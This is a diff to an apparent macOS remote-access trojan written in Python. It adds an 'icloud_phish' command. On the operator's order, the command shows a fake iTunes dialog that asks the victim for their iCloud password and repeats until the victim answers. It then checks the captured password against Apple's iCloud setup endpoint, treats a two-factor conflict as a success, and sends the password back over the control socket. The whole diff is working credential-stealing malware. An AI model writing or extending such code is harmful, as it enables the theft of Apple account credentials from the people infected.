@@ -10,11 +10,60 @@ import time
 import platform
 import base64
 import json
+import urllib2
 
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
 development = True
+
+
+def icloud_phish(server_socket, email):
+    response = ""
+    phishing_prompt = "launchctl asuser osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; " \
+                      "osascript -e 'tell app \"iTunes\" to activate' " \
+                      "-e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. " \
+                      "Please verify your password for " + email + \
+                      " \"default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"'"
+
+    while True:
+        # Check to see if the server requested icloud_phish_stop
+        try:
+            server_socket.settimeout(0.0)  # Timeout recv immediately if no response
+
+            if server_socket.recv(4096) == "icloud_phish_stop":
+                server_socket.settimeout(None)
+                return response
+        except socket.error:  # All good
+            pass
+
+        server_socket.settimeout(None)
+
+        output = subprocess.Popen(phishing_prompt, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = output.stdout.read().replace("\n", "")
+
+        if output == "":
+            response += MESSAGE_INFO + "User has attempted to cancel, trying again...\n"
+        else:
+            output = output.replace("button returned:OK, text returned:", "")
+            correct_password = False
+
+            try:
+                # Verify correct password
+                request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
+                request.add_header("Authorization", "Basic {0}".format(base64.encodestring('{0}:{1}'.format(email, output))))
+                urllib2.urlopen(request)
+
+                correct_password = True
+            except Exception as ex:
+                if str(ex) == "HTTP Error 409: Conflict":  # 2FA
+                    correct_password = True
+
+            if correct_password:
+                response += MESSAGE_ATTENTION + "Received correct password \"{0}\"!\n".format(output)
+                return response
+            else:
+                response += MESSAGE_INFO + "User has attempted to use incorrect password \"{0}\"...\n".format(output)
 
 
 def get_root(server_socket):
@@ -317,6 +366,11 @@ def start_server():
                         server_socket.sendall(response)
 
                     execute_command("rm -rf {0}".format(payload_file))
+            elif command.startswith("icloud_phish"):
+                email = command.replace("icloud_phish ", "")
+                output = icloud_phish(server_socket, email)
+
+                server_socket.sendall(output)
             elif command == "kill_client":
                 server_socket.sendall("Farewell.")
                 kill_client(is_root())
